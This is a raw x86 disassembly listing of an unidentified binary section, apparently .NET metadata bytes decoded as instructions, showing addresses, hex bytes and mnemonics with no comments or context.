  405719:	00 00                	add    %al,(%eax)
  40571b:	00 c6                	add    %al,%dh
  40571d:	08 6c 05 d0          	or     %ch,-0x30(%ebp,%eax,1)
  405721:	00 15 00 fc 21 00    	add    %dl,0x21fc00
  405727:	00 00                	add    %al,(%eax)
  405729:	00 c6                	add    %al,%dh
  40572b:	00 95 05 f9 00 16    	add    %dl,0x1600f905(%ebp)
  405731:	00 87 22 00 00 00    	add    %al,0x22(%edi)
  405737:	00 c6                	add    %al,%dh
  405739:	08 a7 05 06 01 17    	or     %ah,0x17010605(%edi)
  40573f:	00 8a 22 00 00 00    	add    %cl,0x22(%edx)
  405745:	00 c6                	add    %al,%dh
  405747:	08 b8 05 d6 00 17    	or     %bh,0x1700d605(%eax)
  40574d:	00 98 22 00 00 00    	add    %bl,0x22(%eax)
  405753:	00 c6                	add    %al,%dh
  405755:	08 d2                	or     %dl,%dl
  405757:	05 d6 00 17 00       	add    $0x1700d6,%eax
  40575c:	a3 22 00 00 00       	mov    %eax,0x22
  405761:	00 c6                	add    %al,%dh
  405763:	00 fb                	add    %bh,%bl
  405765:	05 0a 01 17 00       	add    $0x17010a,%eax
  40576a:	cd 22                	int    $0x22
  40576c:	00 00                	add    %al,(%eax)
  40576e:	00 00                	add    %al,(%eax)
  405770:	c6 00 03             	movb   $0x3,(%eax)
  405773:	06                   	push   %es
  405774:	11 01                	adc    %eax,(%ecx)
  405776:	18 00                	sbb    %al,(%eax)
  405778:	cf                   	iret
  405779:	22 00                	and    (%eax),%al
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 c6                	add    %al,%dh
  40577f:	00 18                	add    %bl,(%eax)
  405781:	06                   	push   %es
  405782:	1d 01 1c 00 d1       	sbb    $0xd1001c01,%eax
  405787:	22 00                	and    (%eax),%al
  405789:	00 00                	add    %al,(%eax)
  40578b:	00 c6                	add    %al,%dh
  40578d:	00 18                	add    %bl,(%eax)
  40578f:	06                   	push   %es
  405790:	25 01 1e 00 d4       	and    $0xd4001e01,%eax
  405795:	22 00                	and    (%eax),%al
  405797:	00 00                	add    %al,(%eax)
  405799:	00 c6                	add    %al,%dh
  40579b:	08 2a                	or     %ch,(%edx)
  40579d:	06                   	push   %es
  40579e:	e1 00                	loope  0x4057a0
  4057a0:	20 00                	and    %al,(%eax)
  4057a2:	fa                   	cli
  4057a3:	22 00                	and    (%eax),%al
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 c6                	add    %al,%dh
  4057a9:	08 3d 06 e6 00 20    	or     %bh,0x2000e606
  4057af:	00 fc                	add    %bh,%ah
  4057b1:	22 00                	and    (%eax),%al
  4057b3:	00 00                	add    %al,(%eax)
  4057b5:	00 c6                	add    %al,%dh
  4057b7:	08 50 06             	or     %dl,0x6(%eax)
  4057ba:	d6                   	salc
  4057bb:	00 21                	add    %ah,(%ecx)
  4057bd:	00 24 23             	add    %ah,(%ebx,%eiz,1)
  4057c0:	00 00                	add    %al,(%eax)
  4057c2:	00 00                	add    %al,(%eax)
  4057c4:	c6                   	(bad)
  4057c5:	08 5f 06             	or     %bl,0x6(%edi)
  4057c8:	db 00                	fildl  (%eax)
  4057ca:	21 00                	and    %eax,(%eax)
  4057cc:	26 23 00             	and    %es:(%eax),%eax
  4057cf:	00 00                	add    %al,(%eax)
  4057d1:	00 c6                	add    %al,%dh
  4057d3:	08 6e 06             	or     %ch,0x6(%esi)
  4057d6:	33 01                	xor    (%ecx),%eax
  4057d8:	22 00                	and    (%eax),%al
  4057da:	2e 23 00             	and    %cs:(%eax),%eax
  4057dd:	00 00                	add    %al,(%eax)
  4057df:	00 c6                	add    %al,%dh
  4057e1:	08 7e 06             	or     %bh,0x6(%esi)
  4057e4:	37                   	aaa
  4057e5:	01 22                	add    %esp,(%edx)
  4057e7:	00 37                	add    %dh,(%edi)
  4057e9:	23 00                	and    (%eax),%eax
  4057eb:	00 00                	add    %al,(%eax)
  4057ed:	00 86 18 27 02 35    	add    %al,0x35022718(%esi)
  4057f3:	00 23                	add    %ah,(%ebx)
  4057f5:	00 00                	add    %al,(%eax)
  4057f7:	00 00                	add    %al,(%eax)
  4057f9:	00 80 00 91 20 2a    	add    %al,0x2a209100(%eax)
  4057ff:	07                   	pop    %es
  405800:	57                   	push   %edi
  405801:	01 23                	add    %esp,(%ebx)
  405803:	00 58 23             	add    %bl,0x23(%eax)
  405806:	00 00                	add    %al,(%eax)
  405808:	00 00                	add    %al,(%eax)
  40580a:	96                   	xchg   %eax,%esi
  40580b:	00 44 07 5c          	add    %al,0x5c(%edi,%eax,1)
  40580f:	01 24 00             	add    %esp,(%eax,%eax,1)
  405812:	ac                   	lods   %ds:(%esi),%al
  405813:	25 00 00 00 00       	and    $0x0,%eax
  405818:	96                   	xchg   %eax,%esi
  405819:	00 44 07 66          	add    %al,0x66(%edi,%eax,1)
  40581d:	01 28                	add    %ebp,(%eax)
  40581f:	00 b7 25 00 00 00    	add    %dh,0x25(%edi)
  405825:	00 86 18 27 02 35    	add    %al,0x35022718(%esi)
  40582b:	00 2b                	add    %ch,(%ebx)
  40582d:	00 c0                	add    %al,%al
  40582f:	25 00 00 00 00       	and    $0x0,%eax
  405834:	96                   	xchg   %eax,%esi
  405835:	00 44 07 6f          	add    %al,0x6f(%edi,%eax,1)
  405839:	01 2b                	add    %ebp,(%ebx)
  40583b:	00 f0                	add    %dh,%al
  40583d:	28 00                	sub    %al,(%eax)
  40583f:	00 00                	add    %al,(%eax)
  405841:	00 86 18 27 02 35    	add    %al,0x35022718(%esi)
  405847:	00 2f                	add    %ch,(%edi)
  405849:	00 00                	add    %al,(%eax)
  40584b:	00 00                	add    %al,(%eax)
  40584d:	00 80 00 96 20 87    	add    %al,-0x78df6a00(%eax)
  405853:	07                   	pop    %es
  405854:	7c 01                	jl     0x405857
  405856:	2f                   	das
  405857:	00 f8                	add    %bh,%al
  405859:	28 00                	sub    %al,(%eax)
  40585b:	00 00                	add    %al,(%eax)
  40585d:	00 91 00 96 07 88    	add    %dl,-0x77f86a00(%ecx)
  405863:	01 35 00 54 29 00    	add    %esi,0x295400
  405869:	00 00                	add    %al,(%eax)
  40586b:	00 96 00 44 07 90    	add    %dl,-0x6ff8bc00(%esi)
  405871:	01 38                	add    %edi,(%eax)
  405873:	00 5c 2a 00          	add    %bl,0x0(%edx,%ebp,1)
  405877:	00 00                	add    %al,(%eax)
  405879:	00 86 18 27 02 35    	add    %al,0x35022718(%esi)
  40587f:	00 3b                	add    %bh,(%ebx)
  405881:	00 64 2a 00          	add    %ah,0x0(%edx,%ebp,1)
  405885:	00 00                	add    %al,(%eax)
  405887:	00 86 18 27 02 35    	add    %al,0x35022718(%esi)
  40588d:	00 3b                	add    %bh,(%ebx)
  40588f:	00 c0                	add    %al,%al
  405891:	2a 00                	sub    (%eax),%al
  405893:	00 00                	add    %al,(%eax)
  405895:	00 81 00 c8 07 9f    	add    %al,-0x60f83800(%ecx)
  40589b:	01 3b                	add    %edi,(%ebx)
  40589d:	00 fc                	add    %bh,%ah
  40589f:	2b 00                	sub    (%eax),%eax
  4058a1:	00 00                	add    %al,(%eax)
  4058a3:	00 81 00 de 07 9f    	add    %al,-0x60f82200(%ecx)
  4058a9:	01 3d 00 38 2d 00    	add    %edi,0x2d3800
  4058af:	00 00                	add    %al,(%eax)
  4058b1:	00 81 00 7f 08 bb    	add    %al,-0x44f78100(%ecx)
  4058b7:	01 3f                	add    %edi,(%edi)
  4058b9:	00 20                	add    %ah,(%eax)
  4058bb:	2e 00 00             	add    %al,%cs:(%eax)
  4058be:	00 00                	add    %al,(%eax)
  4058c0:	86 18                	xchg   %bl,(%eax)
  4058c2:	27                   	daa
  4058c3:	02 35 00 40 00 70    	add    0x70004000,%dh
  4058c9:	2e 00 00             	add    %al,%cs:(%eax)
  4058cc:	00 00                	add    %al,(%eax)
  4058ce:	86 18                	xchg   %bl,(%eax)
  4058d0:	27                   	daa
  4058d1:	02 d0                	add    %al,%dl
  4058d3:	00 40 00             	add    %al,0x0(%eax)
  4058d6:	c8 2e 00 00          	enter  $0x2e,$0x0
  4058da:	00 00                	add    %al,(%eax)
  4058dc:	86 18                	xchg   %bl,(%eax)
  4058de:	27                   	daa
  4058df:	02 c2                	add    %dl,%al
  4058e1:	01 41 00             	add    %eax,0x0(%ecx)
  4058e4:	28 2f                	sub    %ch,(%edi)
  4058e6:	00 00                	add    %al,(%eax)
  4058e8:	00 00                	add    %al,(%eax)
  4058ea:	81 00 8c 08 35 00    	addl   $0x35088c,(%eax)
  4058f0:	43                   	inc    %ebx
  4058f1:	00 f8                	add    %bh,%al
  4058f3:	2f                   	das
  4058f4:	00 00                	add    %al,(%eax)
  4058f6:	00 00                	add    %al,(%eax)
  4058f8:	81 00 b1 08 c9 01    	addl   $0x1c908b1,(%eax)
  4058fe:	43                   	inc    %ebx
  4058ff:	00 74 30 00          	add    %dh,0x0(%eax,%esi,1)
  405903:	00 00                	add    %al,(%eax)
  405905:	00 81 00 ba 08 d0    	add    %al,-0x2ff74600(%ecx)
  40590b:	01 45 00             	add    %eax,0x0(%ebp)
  40590e:	03 33                	add    (%ebx),%esi
  405910:	00 00                	add    %al,(%eax)
  405912:	00 00                	add    %al,(%eax)
  405914:	86 00                	xchg   %al,(%eax)
  405916:	c1 08 ec             	rorl   $0xec,(%eax)
  405919:	00 47 00             	add    %al,0x0(%edi)
  40591c:	10 33                	adc    %dh,(%ebx)
  40591e:	00 00                	add    %al,(%eax)
  405920:	00 00                	add    %al,(%eax)
  405922:	86 00                	xchg   %al,(%eax)
  405924:	d9 08                	(bad) (%eax)
  405926:	d8 01                	fadds  (%ecx)
  405928:	47                   	inc    %edi
  405929:	00 58 3b             	add    %bl,0x3b(%eax)
  40592c:	00 00                	add    %al,(%eax)
  40592e:	00 00                	add    %al,(%eax)
  405930:	86 18                	xchg   %bl,(%eax)
  405932:	27                   	daa
  405933:	02 35 00 48 00 a4    	add    0xa4004800,%dh
  405939:	3b 00                	cmp    (%eax),%eax
  40593b:	00 00                	add    %al,(%eax)
  40593d:	00 c6                	add    %al,%dh
  40593f:	00 60 0a             	add    %ah,0xa(%eax)
  405942:	ea 01 48 00 44 3f 00 	ljmp   $0x3f,$0x44004801
  405949:	00 00                	add    %al,(%eax)
  40594b:	00 c6                	add    %al,%dh
  40594d:	00 67 0a             	add    %ah,0xa(%edi)
  405950:	fd                   	std
  405951:	01 4b 00             	add    %ecx,0x0(%ebx)
  405954:	64 3f                	fs aas
  405956:	00 00                	add    %al,(%eax)
  405958:	00 00                	add    %al,(%eax)
  40595a:	c6 00 84             	movb   $0x84,(%eax)
  40595d:	0a 0a                	or     (%edx),%cl
  40595f:	02 4f 00             	add    0x0(%edi),%cl
  405962:	c4 3f                	les    (%edi),%edi
  405964:	00 00                	add    %al,(%eax)
  405966:	00 00                	add    %al,(%eax)
  405968:	c6 00 84             	movb   $0x84,(%eax)
  40596b:	0a 18                	or     (%eax),%bl
  40596d:	02 55 00             	add    0x0(%ebp),%dl
  405970:	1f                   	pop    %ds
  405971:	40                   	inc    %eax
  405972:	00 00                	add    %al,(%eax)
  405974:	00 00                	add    %al,(%eax)
  405976:	c6                   	(bad)
  405977:	08 98 0a 22 02 59    	or     %bl,0x5902220a(%eax)
  40597d:	00 28                	add    %ch,(%eax)
  40597f:	40                   	inc    %eax
  405980:	00 00                	add    %al,(%eax)
  405982:	00 00                	add    %al,(%eax)
  405984:	c6 00 ad             	movb   $0xad,(%eax)
  405987:	0a 33                	or     (%ebx),%dh
  405989:	01 59 00             	add    %ebx,0x0(%ecx)
  40598c:	60                   	pusha
  40598d:	40                   	inc    %eax
  40598e:	00 00                	add    %al,(%eax)
  405990:	00 00                	add    %al,(%eax)
  405992:	81 00 d3 0a 27 02    	addl   $0x2270ad3,(%eax)
  405998:	59                   	pop    %ecx
  405999:	00 dc                	add    %bl,%ah
  40599b:	40                   	inc    %eax
  40599c:	00 00                	add    %al,(%eax)
  40599e:	00 00                	add    %al,(%eax)
  4059a0:	c6 00 df             	movb   $0xdf,(%eax)
  4059a3:	0a 27                	or     (%edi),%ah
  4059a5:	02 59 00             	add    0x0(%ecx),%bl
  4059a8:	39 41 00             	cmp    %eax,0x0(%ecx)
  4059ab:	00 00                	add    %al,(%eax)
  4059ad:	00 c6                	add    %al,%dh
  4059af:	00 f6                	add    %dh,%dh
  4059b1:	0a 2d 02 59 00 3b    	or     0x3b005902,%ch
  4059b7:	41                   	inc    %ecx
  4059b8:	00 00                	add    %al,(%eax)
  4059ba:	00 00                	add    %al,(%eax)
  4059bc:	c6 00 f6             	movb   $0xf6,(%eax)
  4059bf:	0a 37                	or     (%edi),%dh
  4059c1:	01 5c 00 3d          	add    %ebx,0x3d(%eax,%eax,1)
  4059c5:	41                   	inc    %ecx
  4059c6:	00 00                	add    %al,(%eax)
  4059c8:	00 00                	add    %al,(%eax)
  4059ca:	c6 00 fc             	movb   $0xfc,(%eax)
  4059cd:	0a 37                	or     (%edi),%dh
  4059cf:	01 5d 00             	add    %ebx,0x0(%ebp)
  4059d2:	3f                   	aas
  4059d3:	41                   	inc    %ecx
  4059d4:	00 00                	add    %al,(%eax)
  4059d6:	00 00                	add    %al,(%eax)
  4059d8:	c6 00 0b             	movb   $0xb,(%eax)
  4059db:	0b 37                	or     (%edi),%esi
  4059dd:	01 5e 00             	add    %ebx,0x0(%esi)
  4059e0:	41                   	inc    %ecx
  4059e1:	41                   	inc    %ecx
  4059e2:	00 00                	add    %al,(%eax)
  4059e4:	00 00                	add    %al,(%eax)
  4059e6:	c6 00 1a             	movb   $0x1a,(%eax)
  4059e9:	0b 35 00 5f 00 43    	or     0x43005f00,%esi
  4059ef:	41                   	inc    %ecx
  4059f0:	00 00                	add    %al,(%eax)
  4059f2:	00 00                	add    %al,(%eax)
  4059f4:	c6 00 1a             	movb   $0x1a,(%eax)
  4059f7:	0b 2d 02 5f 00 45    	or     0x45005f02,%ebp
  4059fd:	41                   	inc    %ecx
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	00 00                	add    %al,(%eax)
  405a02:	c6 00 1a             	movb   $0x1a,(%eax)
  405a05:	0b 37                	or     (%edi),%esi
  405a07:	01 62 00             	add    %esp,0x0(%edx)
  405a0a:	48                   	dec    %eax
  405a0b:	41                   	inc    %ecx
  405a0c:	00 00                	add    %al,(%eax)
  405a0e:	00 00                	add    %al,(%eax)
  405a10:	c6 00 27             	movb   $0x27,(%eax)
  405a13:	0b 3a                	or     (%edx),%edi
  405a15:	02 63 00             	add    0x0(%ebx),%ah
  405a18:	b7 41                	mov    $0x41,%bh
  405a1a:	00 00                	add    %al,(%eax)
  405a1c:	00 00                	add    %al,(%eax)
  405a1e:	c6 00 35             	movb   $0x35,(%eax)
  405a21:	0b 37                	or     (%edi),%esi
  405a23:	01 65 00             	add    %esp,0x0(%ebp)
  405a26:	b9 41 00 00 00       	mov    $0x41,%ecx
  405a2b:	00 c6                	add    %al,%dh
  405a2d:	00 46 0b             	add    %al,0xb(%esi)
  405a30:	37                   	aaa
  405a31:	01 66 00             	add    %esp,0x0(%esi)
  405a34:	bc 41 00 00 00       	mov    $0x41,%esp
  405a39:	00 86 18 27 02 58    	add    %al,0x58022718(%esi)
  405a3f:	02 67 00             	add    0x0(%edi),%ah
  405a42:	08 42 00             	or     %al,0x0(%edx)
  405a45:	00 00                	add    %al,(%eax)
  405a47:	00 c6                	add    %al,%dh
  405a49:	08 bc 0b 60 02 69 00 	or     %bh,0x690260(%ebx,%ecx,1)
  405a50:	42                   	inc    %edx
  405a51:	42                   	inc    %edx
  405a52:	00 00                	add    %al,(%eax)
  405a54:	00 00                	add    %al,(%eax)
  405a56:	c6                   	(bad)
  405a57:	08 df                	or     %bl,%bh
  405a59:	0b 69 02             	or     0x2(%ecx),%ebp
  405a5c:	69 00 4a 42 00 00    	imul   $0x424a,(%eax),%eax
  405a62:	00 00                	add    %al,(%eax)
  405a64:	c6                   	(bad)
  405a65:	08 f2                	or     %dh,%dl
  405a67:	0b 69 02             	or     0x2(%ecx),%ebp
  405a6a:	69 00 52 42 00 00    	imul   $0x4252,(%eax),%eax
  405a70:	00 00                	add    %al,(%eax)
  405a72:	c6                   	(bad)
  405a73:	08 07                	or     %al,(%edi)
  405a75:	0c 6f                	or     $0x6f,%al
  405a77:	02 69 00             	add    0x0(%ecx),%ch
  405a7a:	5a                   	pop    %edx
  405a7b:	42                   	inc    %edx
  405a7c:	00 00                	add    %al,(%eax)
  405a7e:	00 00                	add    %al,(%eax)
  405a80:	c6                   	(bad)
  405a81:	08 16                	or     %dl,(%esi)
  405a83:	0c 33                	or     $0x33,%al
  405a85:	01 69 00             	add    %ebp,0x0(%ecx)
  405a88:	61                   	popa
  405a89:	42                   	inc    %edx
  405a8a:	00 00                	add    %al,(%eax)
  405a8c:	00 00                	add    %al,(%eax)
  405a8e:	c6                   	(bad)
  405a8f:	08 1f                	or     %bl,(%edi)
  405a91:	0c 75                	or     $0x75,%al
  405a93:	02 69 00             	add    0x0(%ecx),%ch
  405a96:	69 42 00 00 00 00 c6 	imul   $0xc6000000,0x0(%edx),%eax
  405a9d:	08 2e                	or     %ch,(%esi)
  405a9f:	0c 7a                	or     $0x7a,%al
  405aa1:	02 69 00             	add    0x0(%ecx),%ch
  405aa4:	75 42                	jne    0x405ae8
  405aa6:	00 00                	add    %al,(%eax)
  405aa8:	00 00                	add    %al,(%eax)
  405aaa:	c6 00 3a             	movb   $0x3a,(%eax)
  405aad:	0c 35                	or     $0x35,%al
  405aaf:	00 69 00             	add    %ch,0x0(%ecx)
  405ab2:	77 42                	ja     0x405af6
  405ab4:	00 00                	add    %al,(%eax)
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	c6 00 4c             	movb   $0x4c,(%eax)
  405abb:	0c 35                	or     $0x35,%al
  405abd:	00 69 00             	add    %ch,0x0(%ecx)
  405ac0:	79 42                	jns    0x405b04
  405ac2:	00 00                	add    %al,(%eax)
  405ac4:	00 00                	add    %al,(%eax)
  405ac6:	c6 00 5d             	movb   $0x5d,(%eax)
  405ac9:	0c 35                	or     $0x35,%al
  405acb:	00 69 00             	add    %ch,0x0(%ecx)
  405ace:	7b 42                	jnp    0x405b12
  405ad0:	00 00                	add    %al,(%eax)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	c6 00 74             	movb   $0x74,(%eax)
  405ad7:	0c 35                	or     $0x35,%al
  405ad9:	00 69 00             	add    %ch,0x0(%ecx)
  405adc:	7d 42                	jge    0x405b20
  405ade:	00 00                	add    %al,(%eax)
  405ae0:	00 00                	add    %al,(%eax)
  405ae2:	c6 00 89             	movb   $0x89,(%eax)
  405ae5:	0c f0                	or     $0xf0,%al
  405ae7:	00 69 00             	add    %ch,0x0(%ecx)
  405aea:	97                   	xchg   %eax,%edi
  405aeb:	42                   	inc    %edx
  405aec:	00 00                	add    %al,(%eax)
  405aee:	00 00                	add    %al,(%eax)
  405af0:	86 18                	xchg   %bl,(%eax)
  405af2:	27                   	daa
  405af3:	02 9c 02 6a 00 b4 42 	add    0x42b4006a(%edx,%eax,1),%bl
  405afa:	00 00                	add    %al,(%eax)
  405afc:	00 00                	add    %al,(%eax)
  405afe:	86 08                	xchg   %cl,(%eax)
  405b00:	da 0c cb             	fimull (%ebx,%ecx,8)
  405b03:	00 6b 00             	add    %ch,0x0(%ebx)
  405b06:	c1 42 00 00          	roll   $0x0,0x0(%edx)
  405b0a:	00 00                	add    %al,(%eax)
  405b0c:	86 08                	xchg   %cl,(%eax)
  405b0e:	f3 0c d0             	repz or $0xd0,%al
  405b11:	00 6b 00             	add    %ch,0x0(%ebx)
  405b14:	cf                   	iret
  405b15:	42                   	inc    %edx
  405b16:	00 00                	add    %al,(%eax)
  405b18:	00 00                	add    %al,(%eax)
  405b1a:	86 08                	xchg   %cl,(%eax)
  405b1c:	0c 0d                	or     $0xd,%al
  405b1e:	cb                   	lret
  405b1f:	00 6c 00 dc          	add    %ch,-0x24(%eax,%eax,1)
  405b23:	42                   	inc    %edx
  405b24:	00 00                	add    %al,(%eax)
  405b26:	00 00                	add    %al,(%eax)
  405b28:	86 08                	xchg   %cl,(%eax)
  405b2a:	25 0d d0 00 6c       	and    $0x6c00d00d,%eax
  405b2f:	00 ea                	add    %ch,%dl
  405b31:	42                   	inc    %edx
  405b32:	00 00                	add    %al,(%eax)
  405b34:	00 00                	add    %al,(%eax)
  405b36:	86 08                	xchg   %cl,(%eax)
  405b38:	3e 0d cb 00 6d 00    	ds or  $0x6d00cb,%eax
  405b3e:	f7 42 00 00 00 00 86 	testl  $0x86000000,0x0(%edx)
  405b45:	08 59 0d             	or     %bl,0xd(%ecx)
  405b48:	d0 00                	rolb   $1,(%eax)
  405b4a:	6d                   	insl   (%dx),%es:(%edi)
  405b4b:	00 05 43 00 00 00    	add    %al,0x43
  405b51:	00 86 08 74 0d cb    	add    %al,-0x34f28bf8(%esi)
  405b57:	00 6e 00             	add    %ch,0x0(%esi)
  405b5a:	12 43 00             	adc    0x0(%ebx),%al
  405b5d:	00 00                	add    %al,(%eax)
  405b5f:	00 86 08 8f 0d d0    	add    %al,-0x2ff270f8(%esi)
  405b65:	00 6e 00             	add    %ch,0x0(%esi)
  405b68:	20 43 00             	and    %al,0x0(%ebx)
  405b6b:	00 00                	add    %al,(%eax)
  405b6d:	00 86 08 aa 0d cb    	add    %al,-0x34f255f8(%esi)
  405b73:	00 6f 00             	add    %ch,0x0(%edi)
  405b76:	2d 43 00 00 00       	sub    $0x43,%eax
  405b7b:	00 86 08 c3 0d d0    	add    %al,-0x2ff23cf8(%esi)
  405b81:	00 6f 00             	add    %ch,0x0(%edi)
  405b84:	3b 43 00             	cmp    0x0(%ebx),%eax
  405b87:	00 00                	add    %al,(%eax)
  405b89:	00 86 08 dc 0d cb    	add    %al,-0x34f223f8(%esi)
  405b8f:	00 70 00             	add    %dh,0x0(%eax)
  405b92:	48                   	dec    %eax
  405b93:	43                   	inc    %ebx
  405b94:	00 00                	add    %al,(%eax)
  405b96:	00 00                	add    %al,(%eax)
  405b98:	86 08                	xchg   %cl,(%eax)
  405b9a:	f5                   	cmc
  405b9b:	0d d0 00 70 00       	or     $0x7000d0,%eax
  405ba0:	56                   	push   %esi
  405ba1:	43                   	inc    %ebx
  405ba2:	00 00                	add    %al,(%eax)
  405ba4:	00 00                	add    %al,(%eax)
  405ba6:	86 08                	xchg   %cl,(%eax)
  405ba8:	0e                   	push   %cs
  405ba9:	0e                   	push   %cs
  405baa:	cb                   	lret
  405bab:	00 71 00             	add    %dh,0x0(%ecx)
  405bae:	63 43 00             	arpl   %eax,0x0(%ebx)
  405bb1:	00 00                	add    %al,(%eax)
  405bb3:	00 86 08 29 0e d0    	add    %al,-0x2ff1d6f8(%esi)
  405bb9:	00 71 00             	add    %dh,0x0(%ecx)
  405bbc:	71 43                	jno    0x405c01
  405bbe:	00 00                	add    %al,(%eax)
  405bc0:	00 00                	add    %al,(%eax)
  405bc2:	86 08                	xchg   %cl,(%eax)
  405bc4:	44                   	inc    %esp
  405bc5:	0e                   	push   %cs
  405bc6:	cb                   	lret
  405bc7:	00 72 00             	add    %dh,0x0(%edx)
  405bca:	7e 43                	jle    0x405c0f
  405bcc:	00 00                	add    %al,(%eax)
  405bce:	00 00                	add    %al,(%eax)
  405bd0:	86 08                	xchg   %cl,(%eax)
  405bd2:	5f                   	pop    %edi
  405bd3:	0e                   	push   %cs
  405bd4:	d0 00                	rolb   $1,(%eax)
  405bd6:	72 00                	jb     0x405bd8
  405bd8:	8c 43 00             	mov    %es,0x0(%ebx)
  405bdb:	00 00                	add    %al,(%eax)
  405bdd:	00 86 08 7a 0e cb    	add    %al,-0x34f185f8(%esi)
  405be3:	00 73 00             	add    %dh,0x0(%ebx)
  405be6:	99                   	cltd
  405be7:	43                   	inc    %ebx
  405be8:	00 00                	add    %al,(%eax)
  405bea:	00 00                	add    %al,(%eax)
  405bec:	86 08                	xchg   %cl,(%eax)
  405bee:	96                   	xchg   %eax,%esi
  405bef:	0e                   	push   %cs
  405bf0:	d0 00                	rolb   $1,(%eax)
  405bf2:	73 00                	jae    0x405bf4
  405bf4:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405bf5:	43                   	inc    %ebx
  405bf6:	00 00                	add    %al,(%eax)
  405bf8:	00 00                	add    %al,(%eax)
  405bfa:	86 08                	xchg   %cl,(%eax)
  405bfc:	b2 0e                	mov    $0xe,%dl
  405bfe:	cb                   	lret
  405bff:	00 74 00 b4          	add    %dh,-0x4c(%eax,%eax,1)
  405c03:	43                   	inc    %ebx
  405c04:	00 00                	add    %al,(%eax)
  405c06:	00 00                	add    %al,(%eax)
  405c08:	86 08                	xchg   %cl,(%eax)
  405c0a:	ce                   	into
  405c0b:	0e                   	push   %cs
  405c0c:	d0 00                	rolb   $1,(%eax)
  405c0e:	74 00                	je     0x405c10
  405c10:	00 00                	add    %al,(%eax)
  405c12:	00 00                	add    %al,(%eax)
  405c14:	00 00                	add    %al,(%eax)
  405c16:	c6                   	(bad)
  405c17:	0d ea 0e 06 01       	or     $0x1060eea,%eax
  405c1c:	75 00                	jne    0x405c1e
  405c1e:	00 00                	add    %al,(%eax)
  405c20:	00 00                	add    %al,(%eax)
  405c22:	00 00                	add    %al,(%eax)
  405c24:	c6                   	(bad)
  405c25:	0d f9 0e a2 02       	or     $0x2a20ef9,%eax
  405c2a:	75 00                	jne    0x405c2c
  405c2c:	00 00                	add    %al,(%eax)
  405c2e:	00 00                	add    %al,(%eax)
  405c30:	00 00                	add    %al,(%eax)
  405c32:	c6                   	(bad)
  405c33:	0d 08 0f ec 00       	or     $0xec0f08,%eax
  405c38:	76 00                	jbe    0x405c3a
  405c3a:	00 00                	add    %al,(%eax)
  405c3c:	00 00                	add    %al,(%eax)
  405c3e:	00 00                	add    %al,(%eax)
  405c40:	c6                   	(bad)
  405c41:	0d 15 0f f0 00       	or     $0xf00f15,%eax
  405c46:	76 00                	jbe    0x405c48
  405c48:	c2 43 00             	ret    $0x43
  405c4b:	00 00                	add    %al,(%eax)
  405c4d:	00 e6                	add    %ah,%dh
  405c4f:	09 ea                	or     %ebp,%edx
  405c51:	0e                   	push   %cs
  405c52:	06                   	push   %es
  405c53:	01 77 00             	add    %esi,0x0(%edi)
  405c56:	ca 43 00             	lret   $0x43
  405c59:	00 00                	add    %al,(%eax)
  405c5b:	00 e6                	add    %ah,%dh
  405c5d:	09 f9                	or     %edi,%ecx
  405c5f:	0e                   	push   %cs
  405c60:	a2 02 77 00 d3       	mov    %al,0xd3007702
  405c65:	43                   	inc    %ebx
  405c66:	00 00                	add    %al,(%eax)
  405c68:	00 00                	add    %al,(%eax)
  405c6a:	e6 09                	out    %al,$0x9
  405c6c:	08 0f                	or     %cl,(%edi)
  405c6e:	ec                   	in     (%dx),%al
  405c6f:	00 78 00             	add    %bh,0x0(%eax)
  405c72:	db 43 00             	fildl  0x0(%ebx)
  405c75:	00 00                	add    %al,(%eax)
  405c77:	00 e6                	add    %ah,%dh
  405c79:	09 15 0f f0 00 78    	or     %edx,0x7800f00f
  405c7f:	00 50 44             	add    %dl,0x44(%eax)
  405c82:	00 00                	add    %al,(%eax)
  405c84:	00 00                	add    %al,(%eax)
  405c86:	91                   	xchg   %eax,%ecx
  405c87:	00 4a 0f             	add    %cl,0xf(%edx)
  405c8a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405c8b:	02 79 00             	add    0x0(%ecx),%bh
  405c8e:	a8 4a                	test   $0x4a,%al
  405c90:	00 00                	add    %al,(%eax)
  405c92:	00 00                	add    %al,(%eax)
  405c94:	91                   	xchg   %eax,%ecx
  405c95:	00 6b 0f             	add    %ch,0xf(%ebx)
  405c98:	ad                   	lods   %ds:(%esi),%eax
  405c99:	02 7a 00             	add    0x0(%edx),%bh
  405c9c:	c3                   	ret
  405c9d:	4a                   	dec    %edx
  405c9e:	00 00                	add    %al,(%eax)
  405ca0:	00 00                	add    %al,(%eax)
  405ca2:	86 18                	xchg   %bl,(%eax)
  405ca4:	27                   	daa
  405ca5:	02 35 00 7c 00 e4    	add    0xe4007c00,%dh
  405cab:	43                   	inc    %ebx
  405cac:	00 00                	add    %al,(%eax)
  405cae:	00 00                	add    %al,(%eax)
  405cb0:	86 18                	xchg   %bl,(%eax)
  405cb2:	27                   	daa
  405cb3:	02 35 00 7c 00 ec    	add    0xec007c00,%dh
  405cb9:	43                   	inc    %ebx
  405cba:	00 00                	add    %al,(%eax)
  405cbc:	00 00                	add    %al,(%eax)
  405cbe:	86 00                	xchg   %al,(%eax)
  405cc0:	2e 1d 53 06 7c 00    	cs sbb $0x7c0653,%eax
  405cc6:	14 44                	adc    $0x44,%al
  405cc8:	00 00                	add    %al,(%eax)
  405cca:	00 00                	add    %al,(%eax)
  405ccc:	86 00                	xchg   %al,(%eax)
  405cce:	39 1d 53 06 7e 00    	cmp    %ebx,0x7e0653
  405cd4:	37                   	aaa
  405cd5:	44                   	inc    %esp
  405cd6:	00 00                	add    %al,(%eax)
  405cd8:	00 00                	add    %al,(%eax)
  405cda:	86 00                	xchg   %al,(%eax)
  405cdc:	51                   	push   %ecx
  405cdd:	1d 5b 06 80 00       	sbb    $0x80065b,%eax
  405ce2:	00 00                	add    %al,(%eax)
  405ce4:	01 00                	add    %eax,(%eax)
  405ce6:	8c 0f                	mov    %cs,(%edi)
  405ce8:	00 00                	add    %al,(%eax)
  405cea:	02 00                	add    (%eax),%al
  405cec:	95                   	xchg   %eax,%ebp
  405ced:	0f 00 00             	sldt   (%eax)
  405cf0:	03 00                	add    (%eax),%eax
  405cf2:	a0 0f 00 00 04       	mov    0x400000f,%al
  405cf7:	00 aa 0f 00 00 05    	add    %ch,0x500000f(%edx)
